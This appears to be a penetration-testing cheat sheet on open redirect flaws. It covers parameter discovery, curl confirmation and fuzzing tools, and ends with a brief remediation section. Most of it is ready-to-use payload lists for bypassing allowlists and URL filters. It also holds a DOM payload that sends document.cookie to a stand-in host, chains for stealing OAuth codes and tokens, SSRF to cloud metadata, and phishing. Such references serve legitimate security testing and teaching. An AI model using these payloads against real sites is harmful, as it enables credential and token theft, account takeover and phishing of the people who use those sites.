# Open Redirect

An open redirect lets an attacker control the destination of a server- or client-side redirect. Alone it's usually low/informational, but it's a force-multiplier: it bypasses SSRF/CSRF/OAuth allowlists, makes phishing land on a trusted domain, and can chain into account takeover by leaking OAuth `code`/tokens.

---

## Detection

### Where it lives

```
?url=  ?next=  ?redirect=  ?redirect_uri=  ?redirect_url=  ?return=  ?returnUrl=
?return_to=  ?returnTo=  ?continue=  ?dest=  ?destination=  ?goto=  ?go=  ?out=
?to=  ?target=  ?link=  ?u=  ?r=  ?rurl=  ?forward=  ?from=  ?callback=  ?checkout_url=
?image_url=  ?path=  ?domain=  ?host=  ?view=  ?login?next=  ?logout?next=
```

Login/logout/SSO flows, "back to site" links, post-action redirects, and email-tracking links are prime spots.

```bash
# Mine params from history/JS
gau TARGET | grep -Ei 'redirect|return|next|url=|goto|dest' 
katana -u https://TARGET -jc | grep -Ei 'redirect|next|return'
```

### Confirm

```bash
curl -sI "https://TARGET/login?next=https://evil.com" | grep -i location
# Look for: Location: https://evil.com   (or a 200 with a JS/meta redirect to it)
```

---

## Exploitation payloads & filter bypasses

### Baseline

```
https://evil.com
//evil.com
/\evil.com
https:evil.com
http://evil.com
```

### Allowlist / "must contain target.com" bypasses

```
https://target.com.evil.com
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
https://evil.com\@target.com
https://target.com@evil.com          (userinfo: real host is evil.com)
https://evil.com%2f%2etarget.com
https://target.com%252f@evil.com
```

### Scheme / slash tricks (browser parses host differently than the filter)

```
//evil.com                          (protocol-relative)
///evil.com
////evil.com
\/\/evil.com
/\/evil.com
/%5cevil.com
https:/evil.com
https:/\evil.com
http:evil.com
\evil.com
%09//evil.com    %0d//evil.com    %0a//evil.com     (whitespace/CRLF)
```

### Encoding & confusion

```
https://evil%E3%80%82com            (ideographic full stop -> '.')
https://evil。com
http://①②⑦.0.0.1
https://evil.com%2523                (double-encoded fragment)
https://target.com%00.evil.com       (null)
https://target.com\.evil.com
data:text/html,<script>location='https://evil.com'</script>   (data scheme redirect)
javascript:alert(document.domain)    (client-side / DOM redirect sinks)
```

### DOM-based open redirect

Look for sinks fed by `location`/`document.URL`:

```javascript
location = new URLSearchParams(location.search).get('url')   // sink
window.location.href = params.redirect
location.assign(userInput)  /  location.replace(userInput)
// Payload: ?url=javascript:fetch('//evil/'+document.cookie)
//          ?url=//evil.com
```

---

## Chaining / escalation (where the value is)

### 1. OAuth / SSO token theft → account takeover

If `redirect_uri` validation is loose, redirect the OAuth `code`/`access_token` to your server:

```
https://idp.com/authorize?client_id=...&redirect_uri=https://target.com.evil.com/cb&response_type=token
# or open redirect on the legit redirect_uri host that bounces to attacker, leaking code in fragment/Referer
https://target.com/oauth/cb?redirect=https://evil.com
```

### 2. Bypass SSRF allowlists

Allowlisted host has an open redirect → SSRF follows it to metadata:

```
?url=https://allowed.com/redirect?to=http://169.254.169.254/latest/meta-data/
```

### 3. Bypass CSRF Referer checks / WAF domain allowlists

Use the redirect to originate the request from the trusted domain.

### 4. Phishing

Link visibly points to `https://trusted.com/...` but lands on the attacker page — high click-through, used to harvest creds.

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Suite** | Manual confirm + chain into OAuth/SSRF |
| **OpenRedireX** | Fuzz redirect params with a bypass payload list |
| **nuclei** | `-tags redirect` templates |
| **gau / katana / paramspider** | Discover redirect params |

```bash
# OpenRedireX
cat urls.txt | openredirex -p payloads.txt -k FUZZ
# nuclei
nuclei -l urls.txt -tags redirect
# paramspider for params
paramspider -d TARGET
```

---

## Remediation

- Avoid user-controlled redirect targets. If needed, use an **allowlist of relative paths** or mapped tokens (`?next=2` → server maps to a known URL).
- Validate that the target is a relative path (`/...`) or an exact host in an allowlist; reject `//`, `\`, `https:`, `@`, encoded slashes, and absolute URLs.
- For OAuth, require **exact** `redirect_uri` matching (no wildcards, no substring).
- Show an interstitial "you are leaving this site" page for external links.

---

## Cheatsheet

```text
https://evil.com   //evil.com   /\evil.com   https:evil.com
https://target.com@evil.com           (userinfo)
https://target.com.evil.com           (subdomain)
https://evil.com#target.com / ?target.com / /target.com
//google%E3%80%82com  (unicode dot)   /%2f/evil.com   /%5cevil.com
%0d%0a//evil.com  %09//evil.com        (whitespace/CRLF)
javascript:alert(document.domain)      (DOM sink)
data:text/html,<script>location='//evil.com'</script>
# OAuth ATO: redirect_uri=https://target.com.evil.com/cb (leak code/token)
```

---

## References

- PortSwigger — DOM-based open redirection: https://portswigger.net/web-security/dom-based/open-redirection
- PayloadsAllTheThings — Open Redirect: https://swisskyrepo.github.io/PayloadsAllTheThings/Open%20Redirect/
- HackTricks — Open Redirect: https://hacktricks.wiki/en/pentesting-web/open-redirect.html
- OWASP — Unvalidated Redirects & Forwards Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- OpenRedireX: https://github.com/devanshbatham/OpenRedireX
